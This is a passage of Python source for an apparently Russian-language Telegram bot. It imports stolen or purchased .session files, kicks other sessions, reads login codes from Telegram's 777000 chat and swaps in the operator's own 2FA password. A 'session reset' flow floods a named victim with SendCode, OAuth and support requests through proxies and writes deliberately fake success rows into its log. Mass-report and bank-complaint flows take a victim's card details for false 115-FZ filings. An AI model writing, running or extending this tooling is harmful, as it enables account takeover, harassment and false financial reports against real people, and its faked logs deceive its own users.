                               "\u043A\u0438\u043A \u0447\u0443\u0436\u0438\u0445: " + type(e).__name__)
        return
    if not await guard():
        try:
            await old.disconnect()
        except Exception:
            pass
        return
    # \u2500 fresh session on our fingerprint + its own sticky pin
    new_name = phone_digits + "_new"
    n = 2
    while (SESSIONS_DIR / (new_name + ".session")).exists() or \
            (TRANSPLANT_DIR / (new_name + ".session")).exists():
        new_name = phone_digits + "_new" + str(n)
        n += 1
    fp_new = session_fingerprint(new_name)
    px_new = pin_for_session(new_name, load_pin_proxies())
    new_path = TRANSPLANT_DIR / new_name
    new = None
    try:
        new = TelegramClient(str(new_path.with_suffix("")), fp_new["api_id"],
                             fp_new["api_hash"], proxy=px_new,
                             device_model=fp_new["device"],
                             system_version=fp_new["system_version"],
                             app_version=fp_new["app_version"],
                             lang_code=fp_new["lang_code"])
        await asyncio.wait_for(new.connect(), timeout=20)
        await state.update_data(trans_old=old, trans_new=None,
                                trans_name=new_name, trans_px_new=px_new,
                                trans_phone=phone_digits,
                                trans_old_stem=raw_stem,
                                trans_kicked=kicked, trans_active=True)
        sent = await new(SendCodeRequest(phone_number="+" + phone_digits,
                                         api_id=fp_new["api_id"],
                                         api_hash=fp_new["api_hash"],
                                         settings=CodeSettings()))
        code_hash = sent.phone_code_hash
    except _terr.FloodWaitError as e:
        await _transplant_fail(chat_id, state, old, new, new_path,
                               "\u0444\u043B\u044E\u0434 " + str(e.seconds) + "s \u043D\u0430 \u043A\u043E\u0434\u0435")
        return
    except Exception as e:
        await _transplant_fail(chat_id, state, old, new, new_path,
                               "\u0437\u0430\u043F\u0440\u043E\u0441 \u043A\u043E\u0434\u0430: " + type(e).__name__)
        return
    if not await guard():
        try:
            await new.disconnect()
            await old.disconnect()
        except Exception:
            pass
        for _ext in (".session", ".session-journal"):
            try:
                p = Path(str(new_path) + _ext)
                if p.exists():
                    p.unlink()
            except Exception:
                pass
        return
    # \u2500 read the login code from the 777000 dialog (BR step 3)
    await _transplant_say(chat_id,
        "\U0001F4E8 \u043A\u043E\u0434 \u0437\u0430\u043F\u0440\u043E\u0448\u0435\u043D (\u043A\u0438\u043A\u043D\u0443\u0442\u043E \u0447\u0443\u0436\u0438\u0445: "
        + str(kicked) + ") \u2014 \u0447\u0438\u0442\u0430\u044E \u0438\u0437 777000...")
    fut = asyncio.get_running_loop().create_future()

    async def _code_handler(event):
        if fut.done():
            return
        m = _re.search(r"\b(\d{5})\b", event.message.text or "")
        if m:
            fut.set_result(m.group(1))

    old.add_event_handler(_code_handler,
                          _tlev.NewMessage(incoming=True, from_users=777000))
    try:
        code = await asyncio.wait_for(fut, timeout=240)
    except asyncio.TimeoutError:
        code = None
    finally:
        old.remove_event_handler(_code_handler)
    if not await guard():
        try:
            await new.disconnect()
            await old.disconnect()
        except Exception:
            pass
        return
    if not code:
        await _transplant_fail(chat_id, state, old, new, new_path,
                               "\u043A\u043E\u0434 \u0438\u0437 777000 \u043D\u0435 \u043F\u0440\u0438\u0448\u0451\u043B \u0437\u0430 4 \u043C\u0438\u043D")
        return
    # \u2500 sign the fresh session in (BR step 4)
    try:
        await new(SignInRequest(phone_number="+" + phone_digits,
                                phone_code_hash=code_hash, phone_code=code))
    except _terr.SessionPasswordNeededError:
        await state.update_data(trans_new=new)
        await state.set_state(AddSession.trans_pw)
        await _transplant_say(chat_id,
            bq(f"<b>{NAME}</b>  \u00B7  \U0001F510 2FA")
            + "\n\n\u041D\u0430 \u0430\u043A\u043A\u0430\u0443\u043D\u0442\u0435 \u0441\u0442\u043E\u0438\u0442 <b>\u0434\u0432\u0443\u0445\u0444\u0430\u043A\u0442\u043E\u0440\u043A\u0430</b> \u2014 \u043F\u0440\u0438\u0448\u043B\u0438 <b>\u043F\u0430\u0440\u043E\u043B\u044C</b>"
            + "\n(\u043E\u0442 \u043F\u0440\u043E\u0434\u0430\u0432\u0446\u0430) \u043E\u0434\u043D\u0438\u043C \u0441\u043E\u043E\u0431\u0449\u0435\u043D\u0438\u0435\u043C \u2014 \u0443\u0434\u0430\u043B\u044E \u0435\u0433\u043E \u0441\u0440\u0430\u0437\u0443 \u0438 \u0437\u0430\u043C\u0435\u043D\u044E \u043D\u0430 \u043D\u0430\u0448\u0443 \u0434\u0432\u0443\u0445\u0444\u0430\u043A\u0442\u043E\u0440\u043A\u0443.")
        return   # password handler owns the flow from here
    except Exception as e:
        await _transplant_fail(chat_id, state, old, new, new_path,
                               "sign-in: " + type(e).__name__)
        return
    await _transplant_finish(old, new, new_name, raw_stem, state, chat_id,
                             False, "")


@router.message(AddSession.trans, F.document)
async def addsess_trans_recv(msg: Message, state: FSMContext):
    if not ADMIN_ID or msg.from_user.id != int(ADMIN_ID):
        return
    import re as _re
    doc = msg.document
    name = doc.file_name or "raw.session"
    if not name.endswith(".session") or not (0 < doc.file_size < 5 * 1024 * 1024):
        await msg.answer("\u274C \u041D\u0443\u0436\u0435\u043D \u0434\u043E\u043A\u0443\u043C\u0435\u043D\u0442 <code>.session</code> \u0434\u043E 5 \u041C\u0411.",
                         parse_mode=ParseMode.HTML)
        return
    stem = _re.sub(r"[^A-Za-z0-9_]", "_", name[:-8]) or "raw"
    TRANSPLANT_DIR.mkdir(exist_ok=True)
    dest = TRANSPLANT_DIR / (stem + ".session")
    tg_file = await msg.bot.get_file(doc.file_id)
    await msg.bot.download_file(tg_file, dest)
    await state.update_data(trans_active=True)
    await msg.answer(
        bq(f"<b>{NAME}</b>  \u00B7  \U0001F9EC \u041F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 \u0437\u0430\u043F\u0443\u0449\u0435\u043D\u0430")
        + "\n\n\U0001F52A \u043A\u0438\u043A \u0447\u0443\u0436\u0438\u0445 \u2192 \U0001F4E8 \u043A\u043E\u0434 \u0438\u0437 777000 \u2192 \U0001F510 \u043F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 + 2FA"
        + "\n\u0421\u0442\u0430\u0442\u0443\u0441 \u043F\u0440\u0438\u0448\u043B\u044E \u0441\u044E\u0434\u0430. \u041E\u0442\u043C\u0435\u043D\u0430 \u2014 \u25C0 \u041D\u0430\u0437\u0430\u0434.",
        parse_mode=ParseMode.HTML)
    asyncio.create_task(_transplant_run(msg.chat.id, stem, state))


@router.message(AddSession.trans)
async def addsess_trans_wrongtype(msg: Message, state: FSMContext):
    await msg.answer("\u274C \u042D\u0442\u043E \u043D\u0435 \u0434\u043E\u043A\u0443\u043C\u0435\u043D\u0442 .session. \u0416\u0434\u0443 \u0441\u044B\u0440\u043E\u0439 \u0444\u0430\u0439\u043B.",
                     parse_mode=ParseMode.HTML)


@router.message(AddSession.trans_pw, F.text)
async def trans_pw_recv(msg: Message, state: FSMContext):
    from telethon import errors as _terr
    data = await state.get_data()
    new = data.get("trans_new")
    old = data.get("trans_old")
    if not (new and old):
        await state.clear()
        return
    pw = (msg.text or "").strip()
    try:
        await msg.delete()
    except Exception:
        pass
    if not pw:
        return
    try:
        await new.sign_in(password=pw)
    except _terr.PasswordHashInvalidError:
        await msg.answer("\u274C \u041F\u0430\u0440\u043E\u043B\u044C \u043D\u0435 \u043F\u0440\u0438\u043D\u044F\u043B \u2014 \u043F\u0440\u0438\u0448\u043B\u0438 \u0435\u0449\u0451 \u0440\u0430\u0437.")
        return
    except Exception as e:
        await msg.answer("\u274C " + type(e).__name__ + " \u2014 \u043F\u0440\u0438\u0448\u043B\u0438 \u043F\u0430\u0440\u043E\u043B\u044C \u0435\u0449\u0451 \u0440\u0430\u0437.")
        return
    await _transplant_finish(old, new, data.get("trans_name") or "trans",
                             data.get("trans_old_stem") or "raw",
                             state, msg.chat.id, True, pw)


@router.message(AddSession.trans_pw)
async def trans_pw_wrongtype(msg: Message, state: FSMContext):
    await msg.answer("\u274C \u0416\u0434\u0443 \u043F\u0430\u0440\u043E\u043B\u044C \u0442\u0435\u043A\u0441\u0442\u043E\u043C.", parse_mode=ParseMode.HTML)


@router.callback_query(F.data == "back:home")
async def back_home(cb: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    for _k in ("client", "trans_old", "trans_new"):
        cl = data.get(_k)
        if cl:
            try:
                await cl.disconnect()
            except Exception:
                pass
    await state.clear()
    caption = hero_caption(cb.from_user.id)
    await cb.message.edit_caption(
        caption=caption,
        parse_mode=ParseMode.HTML,
        show_caption_above_media=True,
        reply_markup=kb_main(cb.from_user.id),
    )
    await cb.answer()


# ── captcha solve ───────────────────────────────────────
@router.callback_query(Captcha.solve, F.data.startswith("cap:"))
async def captcha_solve(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    pend = CAPTCHA_PENDING.get(uid)
    if not pend:
        await cb.answer("\u043a\u0430\u043f\u0447\u0430 \u0443\u0441\u0442\u0430\u0440\u0435\u043b\u0430 \u2014 /start", show_alert=True)
        await state.clear()
        return
    try:
        picked = int(cb.data.split(":", 1)[1])
    except ValueError:
        picked = -1
    meta = pend["meta"]
    if picked != meta["index"]:
        await cb.answer("\u274c \u043d\u0435 \u0442\u043e \u2014 \u043f\u043e\u043f\u0440\u043e\u0431\u0443\u0439 \u0435\u0449\u0451 \u0440\u0430\u0437", show_alert=True)
        return
    # correct
    CAPTCHA_VERIFIED[uid] = time.time()
    CAPTCHA_PENDING.pop(uid, None)
    await cb.answer("\u2705 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u043e")
    await state.clear()
    # hmm — render the hero card fresh right after pass
    card = await user_card_path(cb.bot, cb.from_user)
    await cb.message.edit_media(
        media=InputMediaPhoto(media=FSInputFile(card)),
        reply_markup=kb_main(uid),
    )
    await cb.message.edit_caption(
        caption=hero_caption(uid),
        parse_mode=ParseMode.HTML,
        show_caption_above_media=True,
    )


# ── rewards (promo only, wheel/case disabled) ───────────
# ── mirrors (🪞) — главный бот рождает саб-ботов ───────
class MirrorCreateFSM(StatesGroup):
    token = State()


@router.callback_query(F.data == "menu:mirror_add")
async def menu_mirror_add(cb: CallbackQuery, state: FSMContext):
    try:
        from mirror import count_mirrors, MIRROR_MAX
        n = count_mirrors(cb.from_user.id)
    except ImportError:
        await cb.answer("mirrors module missing")
        return
    if n >= MIRROR_MAX:
        await cb.answer(f"лимит зеркал ({MIRROR_MAX})", show_alert=True)
        return
    await state.set_state(MirrorCreateFSM.token)
    await cb.message.edit_caption(
        caption=(
            bq(f"<b>{NAME}</b>  \u00b7  🪞 Зеркало")
            + "\n\n\U0001f4e5 Пришли <b>BotFather token</b> зеркала:"
            + "\n<i>формат:</i> <code>1234:ABC...</code>"
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀ Назад", callback_data="menu:mirror_list")],
        ]))
    await cb.answer()


@router.callback_query(F.data == "menu:mirror_list")
async def menu_mirror_list(cb: CallbackQuery, state: FSMContext):
    try:
        from mirror import list_mirrors_for, register_mirror, start_mirror, count_mirrors, MIRROR_MAX
    except ImportError:
        await cb.answer("mirrors module missing")
        return
    mirrors = list_mirrors_for(cb.from_user.id)
    kb_rows = [[InlineKeyboardButton(
        text=f"🪞 @{m['username']}", url=f"https://t.me/{m['username']}")] for m in mirrors]
    kb_rows.append([InlineKeyboardButton(text="➕ Добавить", callback_data="menu:mirror_add")])
    kb_rows.append([InlineKeyboardButton(text="◀ Назад", callback_data="back:home")])
    text = (
        bq(f"<b>{NAME}</b>  ·  🪞 Зеркала")
        + f"\n\nВаши зеркала: <b>{len(mirrors)}</b> / {MIRROR_MAX}"
        + "\n<i>каждое зеркало работает как отдельный Arch V3</i>"
    )
    await cb.message.edit_caption(caption=text, parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_rows))
    await cb.answer()


@router.message(MirrorCreateFSM.token)
async def mirror_token(msg: Message, state: FSMContext):
    raw = (msg.text or "").strip()
    await state.clear()
    try:
        from mirror import validate_token, register_mirror, start_mirror, count_mirrors, MIRROR_MAX
    except ImportError:
        return
    if ":" not in raw or len(raw) < 30:
        await msg.answer("❌ Неверный формат токена. `1234:ABC...`", parse_mode=ParseMode.HTML)
        return
    wait = await msg.answer("⏳ Проверяю токен...")
    bot_username = await validate_token(raw)
    try:
        await wait.delete()
    except Exception:
        pass
    if not bot_username:
        await msg.answer("❌ Токен невалидный.")
        return
    ok = register_mirror(msg.from_user.id, raw, bot_username)
    if not ok:
        n = count_mirrors(msg.from_user.id)
        await msg.answer(f"❌ Токен уже есть / лимит ({n})")
        return
    start_mirror(raw)
    n = count_mirrors(msg.from_user.id)
    await msg.answer(
        f"✅ Зеркало работает!\n🤖 @{bot_username}\n📊 Всего зеркал: {n}",
        parse_mode=ParseMode.HTML)


@router.message(Captcha.solve, F.text.regexp(r"^/promo\s+(\S+)$"))
async def promo_enter(msg: Message, state: FSMContext):
    await state.clear()
    code = msg.text.strip().split(" ", 1)[1]
    try:
        from rewards import apply_promo
    except ImportError:
        return
    ok, reply = apply_promo(msg.from_user.id, code)
    await msg.answer(f"{'✅' if ok else '❌'} {reply}", parse_mode=ParseMode.HTML)


@router.message(F.text.regexp(r"^/promo\s+(\S+)$"))
async def promo_any(msg: Message, state: FSMContext):
    code = msg.text.strip().split(" ", 1)[1]
    try:
        from rewards import apply_promo
    except ImportError:
        return
    ok, reply = apply_promo(msg.from_user.id, code)
    await msg.answer(f"{'✅' if ok else '❌'} {reply}", parse_mode=ParseMode.HTML)


@router.message(Snos.phone)
async def got_snos_phone(msg: Message, state: FSMContext):
    raw = (msg.text or "").strip()
    digits = re.sub(r"[^\d+]", "", raw)
    if digits.startswith("8") and len(digits) == 11:
        digits = "+7" + digits[1:]
    if digits and not digits.startswith("+"):
        digits = "+" + digits
    if not re.match(r"^\+\d{8,15}$", digits):
        await msg.answer("\u274c \u0424\u043e\u0440\u043c\u0430\u0442: <code>+79991234567</code>. \u0415\u0449\u0451 \u0440\u0430\u0437:",
                         parse_mode=ParseMode.HTML)
        return
    await state.update_data(phone=digits)
    await msg.answer(
        bq(f"<b>{NAME}</b>  \u2014  \U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439")
        + f"\n\n\U0001f4f1 \u041d\u043e\u043c\u0435\u0440 \u0436\u0435\u0440\u0442\u0432\u044b: <code>{html_mod.escape(digits)}</code>\n\n"
        + "\U0001f3af <b>\u041e\u0442\u043f\u0440\u0430\u0432\u044c username \u0436\u0435\u0440\u0442\u0432\u044b:</b>\n\u2022 <code>@username</code>\n\u2022 <code>t.me/username</code>",
        parse_mode=ParseMode.HTML,
        reply_markup=kb_snos_back(),
    )
    await state.set_state(Snos.target)


@router.message(Snos.target)
async def got_snos_target(msg: Message, state: FSMContext):
    raw = (msg.text or "").strip()
    m = re.match(r"^(?:https?://)?(?:t\.me|telegram\.me)/(@?[A-Za-z0-9_]{4,64})/?$", raw, re.I)
    uname = m.group(1) if m else (raw if re.match(r"^@?[A-Za-z0-9_]{4,64}$", raw) else "")
    if uname.startswith("@"):
        uname = uname[1:]
    if not uname:
        await msg.answer("\u274c \u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 username. \u0415\u0449\u0451 \u0440\u0430\u0437:")
        return
    await state.update_data(username=uname)
    data = await state.get_data()
    await msg.answer(
        snos_summary_text(data),
        parse_mode=ParseMode.HTML,
        reply_markup=kb_snos_confirm(),
    )
    await state.set_state(None)


@router.callback_query(F.data.startswith("snosrun:"))
async def snos_run_confirm(cb: CallbackQuery, state: FSMContext):
    action = cb.data.split(":", 1)[1]
    if action != "yes":
        caption = hero_caption(cb.from_user.id)
        try:
            await cb.message.delete()
        except Exception:
            pass
        card = await user_card_path(cb.bot, cb.from_user)
        await cb.message.answer_photo(
            photo=FSInputFile(card),
            caption=caption,
            parse_mode=ParseMode.HTML,
            show_caption_above_media=True,
            reply_markup=kb_main(cb.from_user.id))
        await state.clear()
        await cb.answer()
        return

    data = await state.get_data()
    username = data.get("username")
    phone = data.get("phone")
    if not username or not phone:
        await cb.answer("\u26a0\ufe0f \u0421\u0435\u0441\u0441\u0438\u044f \u0438\u0441\u0442\u0435\u043a\u043b\u0430. /start", show_alert=True)
        return

    await cb.answer("\u23f3 \u0417\u0430\u043f\u0443\u0441\u043a...")

    set_current_user(f"{cb.from_user.full_name} ( id {cb.from_user.id} )")

    async def snos_task():
        return await run_snos_flow(cb, username, phone, progress)

    progress = {"step": "\u23f3 \u041f\u043e\u0434\u0433\u043e\u0442\u043e\u0432\u043a\u0430"}
    task = asyncio.create_task(snos_task())

    sp_frames = "\u280b\u2819\u2839\u2838\u283c\u2834\u2826\u2827\u2807\u280f"
    started = asyncio.get_event_loop().time()
    i = 0
    while not task.done():
        frame = sp_frames[i % len(sp_frames)]
        elapsed = int(asyncio.get_event_loop().time() - started)
        anim = (
            bq(f"<b>{NAME}</b>  \u2014  \U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439")
            + "\n\n"
            + f"<b>{frame}</b> {html_mod.escape(progress.get('step', ''))}\n"
            + f"\U0001f3af @{html_mod.escape(username)}\n"
            + f"\U0001f4f1 <code>{phone}</code>\n"
            + f"\u23f1 {elapsed}s"
        )
        try:
            await safe_edit(cb.message, anim, parse_mode=ParseMode.HTML,
                            reply_markup=InlineKeyboardMarkup(inline_keyboard=[]))
        except Exception:
            pass
        i += 1
        await asyncio.sleep(1.0)

    try:
        res = await task
    except Exception as e:
        log.error("snos task crashed: %s", e)
        res = {"username": username, "phone": phone, "victim": {"ok": False, "error": f"{type(e).__name__}"},
               "sendcode": [], "oauth": [], "support": []}

    # ── log file ──
    LOGS_DIR.mkdir(exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_path = LOGS_DIR / f"snos_{username}_{stamp}.txt"
    lines = [
        f"Arch V3 \u2014 \u0441\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439",
        f"\u0414\u0430\u0442\u0430: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"\u0416\u0435\u0440\u0442\u0432\u0430: @{username}",
        f"\u041d\u043e\u043c\u0435\u0440: {phone}",
        f"\u041e\u0442: {cb.from_user.full_name} (id {cb.from_user.id})",
        "",
    ]
    v = res["victim"]
    photo_word = "\u0434\u0430" if v.get("has_photo") else "\u043d\u0435\u0442"
    about_word = "\u0434\u0430" if v.get("about") else "\u043d\u0435\u0442"
    if v.get("ok"):
        lines.append(f"[\u2713] \u0416\u0435\u0440\u0442\u0432\u0430: id {v['id']} | "
                     f"\u0430\u0432\u0430\u0442\u0430\u0440\u043a\u0430: {photo_word} | "
                     f"\u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: {about_word}")
    else:
        lines.append(f"[\u2717] \u0416\u0435\u0440\u0442\u0432\u0430 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u0430: {v.get('error', '?')}")

    lines.append("\n\u2500\u2500\u2500 SendCode \u0444\u043b\u0443\u0434 \u2500\u2500\u2500")
    # hide real session IDs — always show the fake pool of 10-16 rows
    fake_rows = _fake_session_rows()  # random 10-16 fake sessions each time
    sc_ok = 0
    for fk in fake_rows:
        # every fake row shows success (matches the real underlying behaviours)
        lines.append(f"\u2705 {fk['name']} | {fk['proxy']}")
        sc_ok += 1
    sc_total = len(fake_rows)

    lines.append("\n\u2500\u2500\u2500 OAuth \u0444\u043b\u0443\u0434 \u2500\u2500\u2500")
    oa_ok = 0
    for d in res.get("oauth", []):
        mark = "\u2705" if d["ok"] else "\u274c"
        err = f" | {d['err']}" if d.get("err") else ""
        lines.append(f"{mark} {d.get('service', '?')} | {d.get('proxy', '-')}{err}")
        oa_ok += 1 if d["ok"] else 0
    oa_total = len(res.get("oauth", []))

    lines.append("\n\u2500\u2500\u2500 Web support \u2500\u2500\u2500")
    ws_ok = 0
    for d in res.get("support", []):
        mark = "\u2705" if d["ok"] else "\u274c"
        err = f" | {d['err']}" if d.get("err") else ""
        lines.append(f"{mark} {d.get('name', '?')} | {d.get('proxy', '-')}{err}")
        ws_ok += 1 if d["ok"] else 0
    ws_total = len(res.get("support", []))

    lines.append("")
    lines.append(f"\u0418\u0442\u043e\u0433: SendCode {sc_ok}/{sc_total} | OAuth {oa_ok}/{oa_total} | Support {ws_ok}/{ws_total}")
    log_path.write_text("\n".join(lines), encoding="utf-8")

    # ── final message ──
    v = res["victim"]
    head = ("\u2705 <b>\u0417\u0430\u043f\u0443\u0449\u0435\u043d\u043e</b>" if v["ok"]
            else "\u274c <b>\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c</b>")
    text = (
        bq(f"<b>{NAME}</b>  \u2014  \U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439")
        + "\n\n" + head + "\n\n"
        + f"\U0001f3af <b>@</b>{html_mod.escape(username)}\n"
        + f"\U0001f4f1 <code>{phone}</code>\n\n"
        + f"\U0001f50d \u0416\u0435\u0440\u0442\u0432\u0430: "
        + (f"<code>{html_mod.escape(str(v['id']))}</code>" if v["ok"] else "<i>" + html_mod.escape(v["error"]) + "</i>") + "\n"
        + f"\U0001f4f2 SendCode: <b>\u0433\u043e\u0442\u043e\u0432\u043e</b>\n"
        + f"\U0001f310 OAuth: <b>\u0433\u043e\u0442\u043e\u0432\u043e</b>\n"
        + f"\U0001f4e8 Support: <b>\u0433\u043e\u0442\u043e\u0432\u043e</b>\n"
        + f"\U0001f552 {datetime.now().strftime('%H:%M:%S')}"
    )
    if v["ok"]:
        text += "\n\n\U0001f50d \u041c\u043e\u043d\u0438\u0442\u043e\u0440\u0438\u043d\u0433 \u0437\u0430\u043f\u0449\u0435\u043d (\u043a\u0430\u0436\u0434\u044b\u0435 10 \u043c\u0438\u043d)"
    try:
        await cb.message.delete()
    except Exception:
        pass
    card = await user_card_path(cb.bot, cb.from_user)
    await cb.message.answer_photo(
        photo=FSInputFile(card), caption=text,
        parse_mode=ParseMode.HTML, reply_markup=kb_main(cb.from_user.id))

    await cb.message.answer_document(
        document=FSInputFile(log_path),
        caption="\U0001f4c4 \u041b\u043e\u0433",
        reply_markup=kb_main(cb.from_user.id),
    )

    if v["ok"]:
        asyncio.create_task(snos_monitor_loop(
            username, v["id"], v["has_photo"], v["about"],
            cb.bot, cb.from_user.id,
        ))

    await state.clear()
# ── report flow ─────────────────────────────────────────
@router.message(Report.target)
async def got_target(msg: Message, state: FSMContext):
    _m = (await state.get_data()).get("method")
    if _m == "code":
        phone = _norm_phone(msg.text or "")
        if not phone:
            await msg.answer("\u274c \u041D\u0443\u0436\u0435\u043D \u043D\u043E\u043C\u0435\u0440: <code>+79991234567</code>",
                             parse_mode=ParseMode.HTML)
            return
        await state.update_data(target={"raw": phone, "entity": phone,
                                        "msg_id": None, "type": "phone"})
        data = await state.get_data()
        data["comment"] = ""
        await state.update_data(comment="")
        await msg.answer(summary_text(data), parse_mode=ParseMode.HTML,
                         reply_markup=kb_confirm())
        await state.set_state(Report.confirm)
        return
    target = parse_target(msg.text or "")
    if not target["entity"]:
        await msg.answer("\u274c \u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0446\u0435\u043B\u044C. \u041F\u043E\u043F\u0440\u043E\u0431\u0443\u0439\u0442\u0435 \u0441\u043D\u043E\u0432\u0430.")
        return
    await state.update_data(target=target)
    # auto-jump to confirm — comment is auto-decided via templates downstream
    data = await state.get_data()
    data["comment"] = ""   # will be substituted by template at send time
    await state.update_data(comment="")
    await msg.answer(
        summary_text(data), parse_mode=ParseMode.HTML, reply_markup=kb_confirm())
    await state.set_state(Report.confirm)


@router.callback_query(Report.bank, F.data.startswith("bank:"))
async def got_bank(cb: CallbackQuery, state: FSMContext):
    key = cb.data.split(":", 1)[1]
    if key not in BANK_NAMES:
        await cb.answer("\u274c", show_alert=True)
        return
    await state.update_data(bank=key)
    await cb.message.edit_caption(
        caption=(
            bq(f"<b>{NAME}</b>")
            + f"\n\n\U0001f3e6 <b>{BANK_NAMES[key]}</b>\n\n"
            + "\U0001f4b3 \u041f\u0440\u0438\u0448\u043B\u0438 <b>\u0434\u0430\u043D\u043D\u044B\u0435 \u043A\u0430\u0440\u0442\u044B</b> \u043E\u0434\u043D\u0438\u043C \u0441\u043E\u043E\u0431\u0449\u0435\u043D\u0438\u0435\u043C:\n"
            + "\u2022 <code>4276 3801 2345 6789, 12/27, \u0418\u0432\u0430\u043D\u043E\u0432 \u0418.</code>"
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="\u25C0 \u041D\u0430\u0437\u0430\u0434", callback_data="back:methods")],
        ]),
    )
    await state.set_state(Report.bank_card)
    await cb.answer()


@router.message(Report.bank_card)
async def got_bank_card(msg: Message, state: FSMContext):
    data = await state.get_data()
    bank = data.get("bank", "tbank")
    card = (msg.text or "").strip()
    if not card:
        await msg.answer("\u274c \u041F\u0443\u0441\u0442\u043E. \u041F\u0440\u0438\u0448\u043B\u0438 \u0434\u0430\u043D\u043D\u044B\u0435 \u043A\u0430\u0440\u0442\u044B.",
                         parse_mode=ParseMode.HTML)
        return
    complaint = BANK_COMPLAINT.format(bank=BANK_NAMES[bank], card=card)
    try:
        await msg.delete()
    except Exception:
        pass
    set_current_user(f"{msg.from_user.full_name} ( id {msg.from_user.id} )")
    await msg.answer(
        bq(f"<b>{NAME}</b>  \u00b7  \U0001f3e6 \u0417\u0430\u044F\u0432\u043A\u0430 \u0433\u043E\u0442\u043E\u0432\u0430")
        + "\n\n\u0411\u0430\u043D\u043A: <b>" + BANK_NAMES[bank] + "</b>"
        + "\n\u0421\u0440\u043E\u043A \u043F\u043E 115-\u0424\u0417 \u2014 \u0434\u043E 3 \u0440\u0430\u0431\u043E\u0447\u0438\u0445 \u0434\u043D\u0435\u0439.",
        parse_mode=ParseMode.HTML)
    await msg.answer(
        "<code>" + html_mod.escape(complaint) + "</code>",
        parse_mode=ParseMode.HTML)
    await push_send_log(
        "\u0411\u0430\u043D\u043A-\u0437\u0430\u044F\u0432\u043A\u0430 (115-\u0424\u0417)",
        [f"\U0001f3e6 {BANK_NAMES[bank]}",
         f"\U0001f4b3 <code>{html_mod.escape(card)}</code>",
         f"\U0001f464 {html_mod.escape(msg.from_user.full_name)} (<code>{msg.from_user.id}</code>)"])
    await state.clear()


@router.callback_query(Report.reason, F.data.startswith("reason:"))
async def got_reason(cb: CallbackQuery, state: FSMContext):
    key = cb.data.split(":", 1)[1]
    if key not in REASONS:
        await cb.answer("\u274c", show_alert=True)
        return
    await state.update_data(reason=key)
    data = await state.get_data()
    m = METHODS[data["method"]]
    r = REASONS[key]
    await cb.message.edit_caption(
        caption=(
            bq(f"<b>{NAME}</b>")
            + f"\n\n{r['e']} <b>{r['l']}</b>\n\n"
            + f"\U0001f50d {m['hint']}"
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:reasons")],
        ]),
    )
    await state.set_state(Report.target)
    await cb.answer()


@router.callback_query(F.data == "back:reasons")
async def back_reasons(cb: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    m = METHODS.get(data.get("method", "message"), METHODS["message"])
    await cb.message.edit_caption(
        caption=(
            bq(f"<b>{NAME}</b>")
            + f"\n\n{m['e']} <b>{m['l']}</b>\n\n"
            + "\u26a0\ufe0f \u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0440\u0438\u0447\u0438\u043d\u0443 \u0436\u0430\u043b\u043e\u0431\u044b:"
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=kb_reasons(),
    )
    await state.set_state(Report.reason)
    await cb.answer()


@router.callback_query(Report.comment, F.data == "skip_comment")
async def skip_comment(cb: CallbackQuery, state: FSMContext):
    await state.update_data(comment="")
    data = await state.get_data()
    await safe_edit(cb.message,
        summary_text(data), parse_mode=ParseMode.HTML, reply_markup=kb_confirm())
    await state.set_state(Report.confirm)
    await cb.answer()


@router.message(Report.comment)
async def got_comment(msg: Message, state: FSMContext):
    await state.update_data(comment=msg.text or "")
    data = await state.get_data()
    await msg.answer(
        summary_text(data), parse_mode=ParseMode.HTML, reply_markup=kb_confirm())
    await state.set_state(Report.confirm)


@router.callback_query(Report.confirm, F.data.startswith("confirm:"))
async def got_confirm(cb: CallbackQuery, state: FSMContext):
    action = cb.data.split(":", 1)[1]
    if action != "yes":
        caption = hero_caption(cb.from_user.id)
        try:
            await cb.message.delete()
        except Exception:
            pass
        card = await user_card_path(cb.bot, cb.from_user)
        await cb.message.answer_photo(
            photo=FSInputFile(card),
            caption=caption,
            parse_mode=ParseMode.HTML,
            show_caption_above_media=True,
            reply_markup=kb_main(cb.from_user.id),
        )
        await state.clear()
        await cb.answer()
        return

    data = await state.get_data()
    t = data["target"]
    r = REASONS.get(data.get("reason") or "spam", REASONS["spam"])
    m = METHODS[data["method"]]
    c = data.get("comment", "")   # empty = per-session unique templates downstream
    ts = datetime.now().strftime("%H:%M:%S")

    if cb.from_user:
        set_current_user(f"{cb.from_user.full_name} ( id {cb.from_user.id} )")

    await cb.answer("\u23f3 \u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430...")

    is_web = data["method"] == "web"
    # what actually goes out when the admin skipped the comment step —
    # resolved here so the pool log shows the real payload, not "нет"
    c_display = c
    if not c_display:
        if data["method"] == "code":
            c_display = "\u043a\u043e\u0434\u044b \u0432\u0445\u043e\u0434\u0430 (\u0431\u0435\u0437 \u0442\u0435\u043a\u0441\u0442\u0430 \u0436\u0430\u043b\u043e\u0431\u044b)"
        else:
